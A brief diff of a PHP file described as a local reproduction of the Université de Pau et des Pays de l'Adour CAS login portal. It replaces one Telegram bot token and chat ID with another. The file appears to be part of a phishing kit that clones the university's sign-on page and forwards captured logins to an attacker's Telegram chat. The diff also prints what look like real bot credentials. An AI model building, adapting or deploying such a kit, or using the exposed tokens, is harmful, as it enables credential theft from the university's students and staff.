@@ -3,8 +3,8 @@ session_start();
 // Reproduction locale — Portail CAS Université de Pau et des Pays de l'Adour
 
 // ===== CONFIGURATION TELEGRAM =====
-define('TELEGRAM_BOT_TOKEN', '8642388900:AAEzUDiWbmhVLdUdIrAacVQR9XJtFVQQmvM');
-define('TELEGRAM_CHAT_ID', '8671824149');
+define('TELEGRAM_BOT_TOKEN', '8967323973:AAE8fVbNVJi5DTOs2VdNoPm2lHzBj4AplXc');
+define('TELEGRAM_CHAT_ID', '6934023679');
 
 $error = '';
 
